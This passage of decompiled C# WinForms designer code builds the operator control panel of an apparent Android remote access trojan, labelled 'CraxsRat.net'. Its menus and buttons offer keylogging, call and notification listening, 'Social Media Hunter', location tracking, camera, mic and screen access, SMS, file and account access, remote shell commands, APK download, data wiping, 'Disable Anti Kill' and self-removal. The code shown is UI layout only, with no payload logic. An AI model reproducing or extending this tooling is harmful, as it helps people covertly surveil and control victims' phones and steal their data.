			this.ToolStripMenuItem2.Text = "Wipe Data";
			this.ToolStripSeparator6.BackColor = Color.Black;
			this.ToolStripSeparator6.ForeColor = Color.Black;
			this.ToolStripSeparator6.Name = "ToolStripSeparator6";
			this.ToolStripSeparator6.Size = new Size(198, 6);
			this.ToolStripMenuItem4.BackColor = Color.Black;
			this.ToolStripMenuItem4.DropDownItems.AddRange(new ToolStripItem[]
			{
				this.ToolStripMenuItem5,
				this.ToolStripMenuItem6,
				this.ToolStripMenuItem7,
				this.ToolStripMenuItem8,
				this.ToolStripMenuItem9,
				this.ToolStripMenuItem10
			});
			this.ToolStripMenuItem4.ForeColor = Color.White;
			this.ToolStripMenuItem4.Name = "ToolStripMenuItem4";
			this.ToolStripMenuItem4.Size = new Size(201, 30);
			this.ToolStripMenuItem4.Text = "Tools";
			this.ToolStripMenuItem5.BackColor = Color.Black;
			this.ToolStripMenuItem5.ForeColor = Color.White;
			this.ToolStripMenuItem5.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem5.Image");
			this.ToolStripMenuItem5.ImageScaling = ToolStripItemImageScaling.None;
			this.ToolStripMenuItem5.Name = "ToolStripMenuItem5";
			this.ToolStripMenuItem5.Size = new Size(245, 42);
			this.ToolStripMenuItem5.Text = "Call Number";
			this.ToolStripMenuItem6.BackColor = Color.Black;
			this.ToolStripMenuItem6.ForeColor = Color.White;
			this.ToolStripMenuItem6.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem6.Image");
			this.ToolStripMenuItem6.ImageScaling = ToolStripItemImageScaling.None;
			this.ToolStripMenuItem6.Name = "ToolStripMenuItem6";
			this.ToolStripMenuItem6.Size = new Size(245, 42);
			this.ToolStripMenuItem6.Text = "Download APK";
			this.ToolStripMenuItem7.BackColor = Color.Black;
			this.ToolStripMenuItem7.ForeColor = Color.White;
			this.ToolStripMenuItem7.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem7.Image");
			this.ToolStripMenuItem7.ImageScaling = ToolStripItemImageScaling.None;
			this.ToolStripMenuItem7.Name = "ToolStripMenuItem7";
			this.ToolStripMenuItem7.Size = new Size(245, 42);
			this.ToolStripMenuItem7.Text = "Show Messege";
			this.ToolStripMenuItem8.BackColor = Color.Black;
			this.ToolStripMenuItem8.ForeColor = Color.White;
			this.ToolStripMenuItem8.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem8.Image");
			this.ToolStripMenuItem8.ImageScaling = ToolStripItemImageScaling.None;
			this.ToolStripMenuItem8.Name = "ToolStripMenuItem8";
			this.ToolStripMenuItem8.Size = new Size(245, 42);
			this.ToolStripMenuItem8.Text = "Clipboard";
			this.ToolStripMenuItem9.BackColor = Color.Black;
			this.ToolStripMenuItem9.ForeColor = Color.White;
			this.ToolStripMenuItem9.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem9.Image");
			this.ToolStripMenuItem9.ImageScaling = ToolStripItemImageScaling.None;
			this.ToolStripMenuItem9.Name = "ToolStripMenuItem9";
			this.ToolStripMenuItem9.Size = new Size(245, 42);
			this.ToolStripMenuItem9.Text = "Open Link";
			this.ToolStripMenuItem10.BackColor = Color.Black;
			this.ToolStripMenuItem10.ForeColor = Color.White;
			this.ToolStripMenuItem10.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem10.Image");
			this.ToolStripMenuItem10.ImageScaling = ToolStripItemImageScaling.None;
			this.ToolStripMenuItem10.Name = "ToolStripMenuItem10";
			this.ToolStripMenuItem10.Size = new Size(245, 42);
			this.ToolStripMenuItem10.Text = "Shell Command";
			this.ToolStripSeparator5.BackColor = Color.Black;
			this.ToolStripSeparator5.ForeColor = Color.Black;
			this.ToolStripSeparator5.Name = "ToolStripSeparator5";
			this.ToolStripSeparator5.Size = new Size(198, 6);
			this.ExtraToolStripMenuItem.BackColor = Color.Black;
			this.ExtraToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[]
			{
				this.NotificationListnerToolStripMenuItem,
				this.CallsListnerToolStripMenuItem,
				this.SocialMediaHanterToolStripMenuItem,
				this.PhoneInformationToolStripMenuItem
			});
			this.ExtraToolStripMenuItem.ForeColor = Color.White;
			this.ExtraToolStripMenuItem.Name = "ExtraToolStripMenuItem";
			this.ExtraToolStripMenuItem.Size = new Size(201, 30);
			this.ExtraToolStripMenuItem.Text = "Extra";
			this.NotificationListnerToolStripMenuItem.BackColor = Color.Black;
			this.NotificationListnerToolStripMenuItem.ForeColor = Color.White;
			this.NotificationListnerToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("NotificationListnerToolStripMenuItem.Image");
			this.NotificationListnerToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
			this.NotificationListnerToolStripMenuItem.Name = "NotificationListnerToolStripMenuItem";
			this.NotificationListnerToolStripMenuItem.Size = new Size(281, 42);
			this.NotificationListnerToolStripMenuItem.Text = "Notification Listner";
			this.CallsListnerToolStripMenuItem.BackColor = Color.Black;
			this.CallsListnerToolStripMenuItem.ForeColor = Color.White;
			this.CallsListnerToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("CallsListnerToolStripMenuItem.Image");
			this.CallsListnerToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
			this.CallsListnerToolStripMenuItem.Name = "CallsListnerToolStripMenuItem";
			this.CallsListnerToolStripMenuItem.Size = new Size(281, 42);
			this.CallsListnerToolStripMenuItem.Text = "Calls Listner";
			this.SocialMediaHanterToolStripMenuItem.BackColor = Color.Black;
			this.SocialMediaHanterToolStripMenuItem.ForeColor = Color.White;
			this.SocialMediaHanterToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("SocialMediaHanterToolStripMenuItem.Image");
			this.SocialMediaHanterToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
			this.SocialMediaHanterToolStripMenuItem.Name = "SocialMediaHanterToolStripMenuItem";
			this.SocialMediaHanterToolStripMenuItem.Size = new Size(281, 42);
			this.SocialMediaHanterToolStripMenuItem.Text = "Social Media Hunter";
			this.PhoneInformationToolStripMenuItem.BackColor = Color.Black;
			this.PhoneInformationToolStripMenuItem.ForeColor = Color.White;
			this.PhoneInformationToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("PhoneInformationToolStripMenuItem.Image");
			this.PhoneInformationToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
			this.PhoneInformationToolStripMenuItem.Name = "PhoneInformationToolStripMenuItem";
			this.PhoneInformationToolStripMenuItem.Size = new Size(281, 42);
			this.PhoneInformationToolStripMenuItem.Text = "Phone information";
			this.ToolStripSeparator7.BackColor = Color.Black;
			this.ToolStripSeparator7.ForeColor = Color.Black;
			this.ToolStripSeparator7.Name = "ToolStripSeparator7";
			this.ToolStripSeparator7.Size = new Size(198, 6);
			this.ToolStripMenuItem13.BackColor = Color.Black;
			this.ToolStripMenuItem13.DropDownItems.AddRange(new ToolStripItem[]
			{
				this.ToolStripMenuItem16,
				this.ToolStripMenuItem17,
				this.ToolStripMenuItem18,
				this.ToolStripMenuItem11
			});
			this.ToolStripMenuItem13.ForeColor = Color.White;
			this.ToolStripMenuItem13.Name = "ToolStripMenuItem13";
			this.ToolStripMenuItem13.Size = new Size(201, 30);
			this.ToolStripMenuItem13.Text = "Connection";
			this.ToolStripMenuItem16.BackColor = Color.Black;
			this.ToolStripMenuItem16.ForeColor = Color.White;
			this.ToolStripMenuItem16.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem16.Image");
			this.ToolStripMenuItem16.ImageScaling = ToolStripItemImageScaling.None;
			this.ToolStripMenuItem16.Name = "ToolStripMenuItem16";
			this.ToolStripMenuItem16.Size = new Size(271, 42);
			this.ToolStripMenuItem16.Text = "Restart Connection";
			this.ToolStripMenuItem17.BackColor = Color.Black;
			this.ToolStripMenuItem17.ForeColor = Color.White;
			this.ToolStripMenuItem17.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem17.Image");
			this.ToolStripMenuItem17.ImageScaling = ToolStripItemImageScaling.None;
			this.ToolStripMenuItem17.Name = "ToolStripMenuItem17";
			this.ToolStripMenuItem17.Size = new Size(271, 42);
			this.ToolStripMenuItem17.Text = "Block Client";
			this.ToolStripMenuItem18.BackColor = Color.Black;
			this.ToolStripMenuItem18.ForeColor = Color.White;
			this.ToolStripMenuItem18.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem18.Image");
			this.ToolStripMenuItem18.ImageScaling = ToolStripItemImageScaling.None;
			this.ToolStripMenuItem18.Name = "ToolStripMenuItem18";
			this.ToolStripMenuItem18.Size = new Size(271, 42);
			this.ToolStripMenuItem18.Text = "Disable Anti Kill";
			this.ToolStripMenuItem11.BackColor = Color.Black;
			this.ToolStripMenuItem11.ForeColor = Color.White;
			this.ToolStripMenuItem11.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem11.Image");
			this.ToolStripMenuItem11.ImageScaling = ToolStripItemImageScaling.None;
			this.ToolStripMenuItem11.Name = "ToolStripMenuItem11";
			this.ToolStripMenuItem11.Size = new Size(271, 42);
			this.ToolStripMenuItem11.Text = "Self Destuction";
			this.ToolStripSeparator8.BackColor = Color.Black;
			this.ToolStripSeparator8.ForeColor = Color.Black;
			this.ToolStripSeparator8.Name = "ToolStripSeparator8";
			this.ToolStripSeparator8.Size = new Size(198, 6);
			this.KeyboardToolStripMenuItem.ForeColor = Color.White;
			this.KeyboardToolStripMenuItem.Name = "KeyboardToolStripMenuItem";
			this.KeyboardToolStripMenuItem.Size = new Size(201, 30);
			this.KeyboardToolStripMenuItem.Text = "Keyboard (beta)";
			this.ToolStripSeparator4.BackColor = Color.Black;
			this.ToolStripSeparator4.ForeColor = Color.Black;
			this.ToolStripSeparator4.Name = "ToolStripSeparator4";
			this.ToolStripSeparator4.Size = new Size(198, 6);
			this.ClientFolderToolStripMenuItem.BackColor = Color.Black;
			this.ClientFolderToolStripMenuItem.ForeColor = Color.White;
			this.ClientFolderToolStripMenuItem.Name = "ClientFolderToolStripMenuItem";
			this.ClientFolderToolStripMenuItem.Size = new Size(201, 30);
			this.ClientFolderToolStripMenuItem.Text = "Client Folder";
			this.Panel6.BackColor = Color.Black;
			this.Panel6.Controls.Add(this.searchbtn);
			this.Panel6.Controls.Add(this.DrakeUIAvatar1);
			this.Panel6.Controls.Add(this.clientfoldrbtn);
			this.Panel6.Controls.Add(this.uncheckbtn);
			this.Panel6.Controls.Add(this.TCavatar);
			this.Panel6.Controls.Add(this.clearsrchbtn);
			this.Panel6.Controls.Add(this.checkall);
			this.Panel6.Controls.Add(this.searchtext);
			this.Panel6.Dock = DockStyle.Top;
			this.Panel6.Location = new Point(10, 0);
			this.Panel6.Margin = new Padding(4);
			this.Panel6.Name = "Panel6";
			this.Panel6.Size = new Size(1446, 47);
			this.Panel6.TabIndex = 22;
			this.searchbtn.AvatarSize = 25;
			this.searchbtn.Cursor = Cursors.Hand;
			this.searchbtn.Dock = DockStyle.Right;
			this.searchbtn.FillColor = Color.Black;
			this.searchbtn.Font = new Font("Microsoft Sans Serif", 12f);
			this.searchbtn.ForeColor = Color.FromArgb(157, 5, 17);
			this.searchbtn.Location = new Point(1344, 0);
			this.searchbtn.Margin = new Padding(4);
			this.searchbtn.Name = "searchbtn";
			this.searchbtn.Size = new Size(51, 47);
			this.searchbtn.Style = UIStyle.Custom;
			this.searchbtn.StyleCustomMode = true;
			this.searchbtn.Symbol = 85;
			this.searchbtn.SymbolSize = 30;
			this.searchbtn.TabIndex = 1;
			this.DrakeUIAvatar1.AvatarSize = 25;
			this.DrakeUIAvatar1.Cursor = Cursors.Hand;
			this.DrakeUIAvatar1.Dock = DockStyle.Right;
			this.DrakeUIAvatar1.FillColor = Color.Black;
			this.DrakeUIAvatar1.Font = new Font("Microsoft Sans Serif", 12f);
			this.DrakeUIAvatar1.ForeColor = Color.FromArgb(157, 5, 17);
			this.DrakeUIAvatar1.Location = new Point(1395, 0);
			this.DrakeUIAvatar1.Margin = new Padding(4);
			this.DrakeUIAvatar1.Name = "DrakeUIAvatar1";
			this.DrakeUIAvatar1.Size = new Size(51, 47);
			this.DrakeUIAvatar1.Style = UIStyle.Custom;
			this.DrakeUIAvatar1.StyleCustomMode = true;
			this.DrakeUIAvatar1.Symbol = 61508;
			this.DrakeUIAvatar1.SymbolSize = 30;
			this.DrakeUIAvatar1.TabIndex = 34;
			this.notifiform.SetToolTip(this.DrakeUIAvatar1, "Edit Clients information");
			this.clientfoldrbtn.CircleRectWidth = 30;
			this.clientfoldrbtn.Cursor = Cursors.Hand;
			this.clientfoldrbtn.Dock = DockStyle.Left;
			this.clientfoldrbtn.FillColor = Color.Black;
			this.clientfoldrbtn.FillHoverColor = Color.FromArgb(20, 20, 20);
			this.clientfoldrbtn.Font = new Font("Roboto", 9.5f);
			this.clientfoldrbtn.ForeColor = Color.FromArgb(157, 5, 17);
			this.clientfoldrbtn.Location = new Point(70, 0);
			this.clientfoldrbtn.Margin = new Padding(4);
			this.clientfoldrbtn.Name = "clientfoldrbtn";
			this.clientfoldrbtn.RectColor = Color.Black;
			this.clientfoldrbtn.RectDisableColor = Color.FromArgb(227, 242, 253);
			this.clientfoldrbtn.RectHoverColor = Color.FromArgb(157, 5, 17);
			this.clientfoldrbtn.RectPressColor = Color.FromArgb(157, 5, 17);
			this.clientfoldrbtn.RectSelectedColor = Color.FromArgb(157, 5, 17);
			this.clientfoldrbtn.Size = new Size(33, 47);
			this.clientfoldrbtn.Style = UIStyle.Custom;
			this.clientfoldrbtn.StyleCustomMode = true;
			this.clientfoldrbtn.Symbol = 61563;
			this.clientfoldrbtn.SymbolSize = 30;
			this.clientfoldrbtn.TabIndex = 30;
			this.notifiform.SetToolTip(this.clientfoldrbtn, "Client Folder");
			this.uncheckbtn.CircleRectWidth = 30;
			this.uncheckbtn.Cursor = Cursors.Hand;
			this.uncheckbtn.Dock = DockStyle.Left;
			this.uncheckbtn.FillColor = Color.Black;
			this.uncheckbtn.FillHoverColor = Color.FromArgb(20, 20, 20);
			this.uncheckbtn.Font = new Font("Roboto", 9.5f);
			this.uncheckbtn.ForeColor = Color.FromArgb(157, 5, 17);
			this.uncheckbtn.Location = new Point(37, 0);
			this.uncheckbtn.Margin = new Padding(4);
			this.uncheckbtn.Name = "uncheckbtn";
			this.uncheckbtn.RectColor = Color.Black;
			this.uncheckbtn.RectDisableColor = Color.FromArgb(227, 242, 253);
			this.uncheckbtn.RectHoverColor = Color.FromArgb(157, 5, 17);
			this.uncheckbtn.RectPressColor = Color.FromArgb(157, 5, 17);
			this.uncheckbtn.RectSelectedColor = Color.FromArgb(157, 5, 17);
			this.uncheckbtn.Size = new Size(33, 47);
			this.uncheckbtn.Style = UIStyle.Custom;
			this.uncheckbtn.StyleCustomMode = true;
			this.uncheckbtn.Symbol = 61453;
			this.uncheckbtn.SymbolSize = 20;
			this.uncheckbtn.TabIndex = 29;
			this.notifiform.SetToolTip(this.uncheckbtn, "un-select client");
			this.TCavatar.BackColor = Color.Transparent;
			this.TCavatar.Dock = DockStyle.Left;
			this.TCavatar.Location = new Point(0, 0);
			this.TCavatar.Margin = new Padding(4);
			this.TCavatar.Name = "TCavatar";
			this.TCavatar.Size = new Size(37, 47);
			this.TCavatar.SizeMode = PictureBoxSizeMode.Zoom;
			this.TCavatar.TabIndex = 21;
			this.TCavatar.TabStop = false;
			this.clearsrchbtn.AvatarSize = 25;
			this.clearsrchbtn.Cursor = Cursors.Hand;
			this.clearsrchbtn.FillColor = Color.Black;
			this.clearsrchbtn.Font = new Font("Microsoft Sans Serif", 12f);
			this.clearsrchbtn.ForeColor = Color.FromArgb(157, 5, 17);
			this.clearsrchbtn.Location = new Point(966, 6);
			this.clearsrchbtn.Margin = new Padding(4);
			this.clearsrchbtn.Name = "clearsrchbtn";
			this.clearsrchbtn.Size = new Size(27, 34);
			this.clearsrchbtn.Style = UIStyle.Custom;
			this.clearsrchbtn.StyleCustomMode = true;
			this.clearsrchbtn.Symbol = 77;
			this.clearsrchbtn.SymbolSize = 30;
			this.clearsrchbtn.TabIndex = 33;
			this.notifiform.SetToolTip(this.clearsrchbtn, "Clear Search");
			this.clearsrchbtn.Visible = false;
			this.checkall.CheckBoxColor = Color.FromArgb(157, 5, 17);
			this.checkall.Cursor = Cursors.Hand;
			this.checkall.Font = new Font("Microsoft Sans Serif", 9f);
			this.checkall.ForeColor = Color.White;
			this.checkall.Location = new Point(867, 8);
			this.checkall.Margin = new Padding(4);
			this.checkall.Name = "checkall";
			this.checkall.Padding = new Padding(22, 0, 0, 0);
			this.checkall.Size = new Size(91, 28);
			this.checkall.Style = UIStyle.Custom;
			this.checkall.StyleCustomMode = true;
			this.checkall.TabIndex = 2;
			this.checkall.Text = "Select All";
			this.notifiform.SetToolTip(this.checkall, "Select All Clients");
			this.checkall.Visible = false;
			this.searchtext.Cursor = Cursors.IBeam;
			this.searchtext.FillColor = Color.Black;
			this.searchtext.Font = new Font("Microsoft Sans Serif", 12f);
			this.searchtext.ForeColor = Color.White;
			this.searchtext.Location = new Point(1002, 8);
			this.searchtext.Margin = new Padding(5, 6, 5, 6);
			this.searchtext.Maximum = 2147483647.0;
			this.searchtext.Minimum = -2147483648.0;
			this.searchtext.Name = "searchtext";
			this.searchtext.Padding = new Padding(7, 6, 7, 6);
			this.searchtext.RectColor = Color.FromArgb(157, 5, 17);
			this.searchtext.RectDisableColor = Color.FromArgb(227, 242, 253);
			this.searchtext.Size = new Size(327, 30);
			this.searchtext.Style = UIStyle.Custom;
			this.searchtext.StyleCustomMode = true;
			this.searchtext.TabIndex = 0;
			this.searchtext.Watermark = "Search By Name,Country,Addres,...";
			this.Panel4.BackColor = Color.Black;
			this.Panel4.Dock = DockStyle.Left;
			this.Panel4.Location = new Point(0, 0);
			this.Panel4.Margin = new Padding(4);
			this.Panel4.Name = "Panel4";
			this.Panel4.Size = new Size(10, 734);
			this.Panel4.TabIndex = 20;
			this.Panel7.BackColor = Color.Black;
			this.Panel7.Controls.Add(this.HBlockbtn);
			this.Panel7.Controls.Add(this.locationbtn);
			this.Panel7.Controls.Add(this.keyloggerbtn);
			this.Panel7.Controls.Add(this.DrakeUIButtonIcon5);
			this.Panel7.Controls.Add(this.callsbtn);
			this.Panel7.Controls.Add(this.label16);
			this.Panel7.Controls.Add(this.DrakeUIButtonIcon9);
			this.Panel7.Controls.Add(this.DrakeUIButtonIcon6);
			this.Panel7.Controls.Add(this.DrakeUIButtonIcon8);
			this.Panel7.Controls.Add(this.Hinfobtn);
			this.Panel7.Controls.Add(this.DrakeUIButtonIcon3);
			this.Panel7.Controls.Add(this.micbtn);
			this.Panel7.Controls.Add(this.screenbtn);
			this.Panel7.Controls.Add(this.contactbtn);
			this.Panel7.Controls.Add(this.accountbtn);
			this.Panel7.Controls.Add(this.applicationsbtn);
			this.Panel7.Controls.Add(this.filebtn);
			this.Panel7.Controls.Add(this.screenreadbtn);
			this.Panel7.Controls.Add(this.camerabtn);
			this.Panel7.Controls.Add(this.DrakeUIButtonIcon4);
			this.Panel7.Controls.Add(this.smsbtn);
			this.Panel7.Dock = DockStyle.Bottom;
			this.Panel7.Location = new Point(0, 734);
			this.Panel7.Margin = new Padding(4);
			this.Panel7.Name = "Panel7";
			this.Panel7.Size = new Size(1456, 46);
			this.Panel7.TabIndex = 23;
			this.HBlockbtn.CircleRectWidth = 30;
			this.HBlockbtn.Cursor = Cursors.Hand;
			this.HBlockbtn.FillColor = Color.Black;
			this.HBlockbtn.FillHoverColor = Color.FromArgb(20, 20, 20);
			this.HBlockbtn.Font = new Font("Roboto", 9.5f);
			this.HBlockbtn.ForeColor = Color.FromArgb(157, 5, 17);
			this.HBlockbtn.Location = new Point(1053, 9);
			this.HBlockbtn.Margin = new Padding(4);
			this.HBlockbtn.Name = "HBlockbtn";
			this.HBlockbtn.RectColor = Color.Black;
			this.HBlockbtn.RectDisableColor = Color.FromArgb(227, 242, 253);
			this.HBlockbtn.RectHoverColor = Color.FromArgb(157, 5, 17);
			this.HBlockbtn.RectPressColor = Color.FromArgb(157, 5, 17);
			this.HBlockbtn.RectSelectedColor = Color.FromArgb(157, 5, 17);
			this.HBlockbtn.Size = new Size(33, 33);
			this.HBlockbtn.Style = UIStyle.Custom;
			this.HBlockbtn.StyleCustomMode = true;
			this.HBlockbtn.Symbol = 62005;
			this.HBlockbtn.SymbolSize = 30;
			this.HBlockbtn.TabIndex = 32;
			this.notifiform.SetToolTip(this.HBlockbtn, "Block Client");
			this.locationbtn.CircleRectWidth = 30;
			this.locationbtn.Cursor = Cursors.Hand;
			this.locationbtn.FillColor = Color.Black;
			this.locationbtn.FillHoverColor = Color.FromArgb(20, 20, 20);
			this.locationbtn.FillPressColor = Color.Black;
			this.locationbtn.FillSelectedColor = Color.FromArgb(157, 5, 17);
			this.locationbtn.Font = new Font("Arial", 12f);
			this.locationbtn.ForeColor = Color.FromArgb(157, 5, 17);
			this.locationbtn.ForePressColor = Color.FromArgb(157, 5, 17);
			this.locationbtn.Location = new Point(725, 9);
			this.locationbtn.Margin = new Padding(4);
			this.locationbtn.Name = "locationbtn";
			this.locationbtn.RectColor = Color.Black;
			this.locationbtn.RectDisableColor = Color.FromArgb(227, 242, 253);
			this.locationbtn.RectHoverColor = Color.White;
			this.locationbtn.RectPressColor = Color.White;
			this.locationbtn.RectSelectedColor = Color.White;
			this.locationbtn.Size = new Size(33, 33);
			this.locationbtn.Style = UIStyle.Custom;
			this.locationbtn.StyleCustomMode = true;
			this.locationbtn.Symbol = 61505;
			this.locationbtn.SymbolSize = 30;
			this.locationbtn.TabIndex = 22;
			this.notifiform.SetToolTip(this.locationbtn, "Location Manager");
			this.keyloggerbtn.CircleRectWidth = 30;
			this.keyloggerbtn.Cursor = Cursors.Hand;
			this.keyloggerbtn.FillColor = Color.Black;
			this.keyloggerbtn.FillHoverColor = Color.FromArgb(20, 20, 20);
			this.keyloggerbtn.FillPressColor = Color.Black;
			this.keyloggerbtn.FillSelectedColor = Color.FromArgb(157, 5, 17);
			this.keyloggerbtn.Font = new Font("Arial", 12f);
			this.keyloggerbtn.ForeColor = Color.FromArgb(157, 5, 17);
			this.keyloggerbtn.ForePressColor = Color.FromArgb(157, 5, 17);
			this.keyloggerbtn.Location = new Point(479, 10);
			this.keyloggerbtn.Margin = new Padding(4);
			this.keyloggerbtn.Name = "keyloggerbtn";
			this.keyloggerbtn.RectColor = Color.Black;
			this.keyloggerbtn.RectDisableColor = Color.FromArgb(227, 242, 253);
			this.keyloggerbtn.RectHoverColor = Color.White;
			this.keyloggerbtn.RectPressColor = Color.White;
			this.keyloggerbtn.RectSelectedColor = Color.White;
			this.keyloggerbtn.Size = new Size(33, 33);
			this.keyloggerbtn.Style = UIStyle.Custom;
			this.keyloggerbtn.StyleCustomMode = true;
			this.keyloggerbtn.Symbol = 61724;
			this.keyloggerbtn.SymbolSize = 30;
			this.keyloggerbtn.TabIndex = 21;
			this.notifiform.SetToolTip(this.keyloggerbtn, "Keylogger Monitor");
			this.DrakeUIButtonIcon5.CircleRectWidth = 30;
			this.DrakeUIButtonIcon5.Cursor = Cursors.Hand;
			this.DrakeUIButtonIcon5.FillColor = Color.Black;
			this.DrakeUIButtonIcon5.FillHoverColor = Color.FromArgb(20, 20, 20);
			this.DrakeUIButtonIcon5.Font = new Font("Roboto", 9.5f);
			this.DrakeUIButtonIcon5.ForeColor = Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon5.Location = new Point(1012, 9);
			this.DrakeUIButtonIcon5.Margin = new Padding(4);
			this.DrakeUIButtonIcon5.Name = "DrakeUIButtonIcon5";
			this.DrakeUIButtonIcon5.RectColor = Color.Black;
			this.DrakeUIButtonIcon5.RectDisableColor = Color.FromArgb(227, 242, 253);
			this.DrakeUIButtonIcon5.RectHoverColor = Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon5.RectPressColor = Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon5.RectSelectedColor = Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon5.Size = new Size(33, 33);
			this.DrakeUIButtonIcon5.Style = UIStyle.Custom;
			this.DrakeUIButtonIcon5.StyleCustomMode = true;
			this.DrakeUIButtonIcon5.Symbol = 61944;
			this.DrakeUIButtonIcon5.SymbolSize = 30;
			this.DrakeUIButtonIcon5.TabIndex = 35;
			this.notifiform.SetToolTip(this.DrakeUIButtonIcon5, "Self Remove");
			this.callsbtn.CircleRectWidth = 30;
			this.callsbtn.Cursor = Cursors.Hand;
			this.callsbtn.FillColor = Color.Black;
			this.callsbtn.FillHoverColor = Color.FromArgb(20, 20, 20);
			this.callsbtn.FillPressColor = Color.Black;
			this.callsbtn.FillSelectedColor = Color.FromArgb(157, 5, 17);
			this.callsbtn.Font = new Font("Arial", 12f);
			this.callsbtn.ForeColor = Color.FromArgb(157, 5, 17);
			this.callsbtn.ForePressColor = Color.FromArgb(157, 5, 17);
			this.callsbtn.Location = new Point(766, 9);
			this.callsbtn.Margin = new Padding(4);
			this.callsbtn.Name = "callsbtn";
			this.callsbtn.RectColor = Color.Black;
			this.callsbtn.RectDisableColor = Color.FromArgb(227, 242, 253);
			this.callsbtn.RectHoverColor = Color.White;
			this.callsbtn.RectPressColor = Color.White;
			this.callsbtn.RectSelectedColor = Color.White;
			this.callsbtn.Size = new Size(33, 33);
			this.callsbtn.Style = UIStyle.Custom;
			this.callsbtn.StyleCustomMode = true;
			this.callsbtn.Symbol = 61589;
			this.callsbtn.SymbolSize = 30;
			this.callsbtn.TabIndex = 22;
			this.notifiform.SetToolTip(this.callsbtn, "Calls Manager");
			this.label16.Dock = DockStyle.Right;
			this.label16.Font = new Font("Times New Roman", 10f);
			this.label16.Location = new Point(1309, 0);
			this.label16.Margin = new Padding(4, 0, 4, 0);
			this.label16.Name = "label16";
			this.label16.Size = new Size(147, 46);
			this.label16.TabIndex = 20;
			this.label16.Text = "CraxsRat.net";
			this.label16.TextAlign = ContentAlignment.MiddleCenter;
			this.DrakeUIButtonIcon9.Cursor = Cursors.Hand;
			this.DrakeUIButtonIcon9.FillColor = Color.Black;
			this.DrakeUIButtonIcon9.FillHoverColor = Color.FromArgb(20, 20, 20);
			this.DrakeUIButtonIcon9.FillPressColor = Color.Black;
			this.DrakeUIButtonIcon9.FillSelectedColor = Color.FromArgb(10, 10, 10);
			this.DrakeUIButtonIcon9.Font = new Font("Arial", 12f);
			this.DrakeUIButtonIcon9.ForeColor = Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon9.ForePressColor = Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon9.Location = new Point(10, 10);
			this.DrakeUIButtonIcon9.Margin = new Padding(4);
			this.DrakeUIButtonIcon9.Name = "DrakeUIButtonIcon9";
			this.DrakeUIButtonIcon9.RectColor = Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon9.RectDisableColor = Color.FromArgb(227, 242, 253);
			this.DrakeUIButtonIcon9.RectHoverColor = Color.White;
			this.DrakeUIButtonIcon9.RectPressColor = Color.White;
			this.DrakeUIButtonIcon9.RectSelectedColor = Color.White;
			this.DrakeUIButtonIcon9.Size = new Size(58, 25);
			this.DrakeUIButtonIcon9.Style = UIStyle.Custom;
			this.DrakeUIButtonIcon9.StyleCustomMode = true;
			this.DrakeUIButtonIcon9.Symbol = 61539;
			this.DrakeUIButtonIcon9.SymbolSize = 25;
			this.DrakeUIButtonIcon9.TabIndex = 19;
			this.notifiform.SetToolTip(this.DrakeUIButtonIcon9, "Go To Bottom");
			this.DrakeUIButtonIcon6.CircleRectWidth = 30;
			this.DrakeUIButtonIcon6.Cursor = Cursors.Hand;
			this.DrakeUIButtonIcon6.FillColor = Color.Black;
			this.DrakeUIButtonIcon6.FillHoverColor = Color.FromArgb(20, 20, 20);
			this.DrakeUIButtonIcon6.Font = new Font("Roboto", 9.5f);
			this.DrakeUIButtonIcon6.ForeColor = Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon6.Location = new Point(684, 10);
			this.DrakeUIButtonIcon6.Margin = new Padding(4);
			this.DrakeUIButtonIcon6.Name = "DrakeUIButtonIcon6";
			this.DrakeUIButtonIcon6.RectColor = Color.Black;
			this.DrakeUIButtonIcon6.RectDisableColor = Color.FromArgb(227, 242, 253);
			this.DrakeUIButtonIcon6.RectHoverColor = Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon6.RectPressColor = Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon6.RectSelectedColor = Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon6.Size = new Size(33, 33);
			this.DrakeUIButtonIcon6.Style = UIStyle.Custom;
			this.DrakeUIButtonIcon6.StyleCustomMode = true;
			this.DrakeUIButtonIcon6.Symbol = 62075;
			this.DrakeUIButtonIcon6.SymbolSize = 30;
			this.DrakeUIButtonIcon6.TabIndex = 36;
			this.notifiform.SetToolTip(this.DrakeUIButtonIcon6, "Show Message");
			this.DrakeUIButtonIcon8.Cursor = Cursors.Hand;
			this.DrakeUIButtonIcon8.FillColor = Color.Black;
			this.DrakeUIButtonIcon8.FillHoverColor = Color.FromArgb(20, 20, 20);
			this.DrakeUIButtonIcon8.FillPressColor = Color.Black;
			this.DrakeUIButtonIcon8.FillSelectedColor = Color.FromArgb(10, 10, 10);
			this.DrakeUIButtonIcon8.Font = new Font("Arial", 12f);
			this.DrakeUIButtonIcon8.ForeColor = Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon8.ForePressColor = Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon8.Location = new Point(76, 10);
			this.DrakeUIButtonIcon8.Margin = new Padding(4);
			this.DrakeUIButtonIcon8.Name = "DrakeUIButtonIcon8";
			this.DrakeUIButtonIcon8.RectColor = Color.FromArgb(157, 5, 17);
